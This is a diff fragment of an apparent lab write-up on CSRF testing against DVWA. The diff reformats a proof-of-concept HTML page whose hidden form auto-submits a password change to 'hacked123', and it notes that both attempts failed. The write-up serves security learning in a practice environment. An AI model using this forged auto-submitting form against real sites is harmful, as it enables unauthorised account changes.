@@ -160,11 +160,16 @@ without verifying their origin at all.
 <http://localhost:8080/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change></ins>
 and then
 
-\<form action="http://dvwa/vulnerabilities/csrf/" method="GET"\> \<input
-type="hidden" name="password_new" value="hacked123"\> \<input
-type="hidden" name="password_conf" value="hacked123"\> \<input
-type="hidden" name="Change" value="Change"\> \</form\> \<script\>
-document.forms\[0\].submit(); \</script\> in a new html file
+```html
+<form action="http://dvwa/vulnerabilities/csrf/" method="GET">
+  <input type="hidden" name="password_new" value="hacked123">
+  <input type="hidden" name="password_conf" value="hacked123">
+  <input type="hidden" name="Change" value="Change">
+</form>
+<script>
+document.forms[0].submit();
+</script>
+```
 
 <ins>Result:</ins> Password change failed on both attempts
 
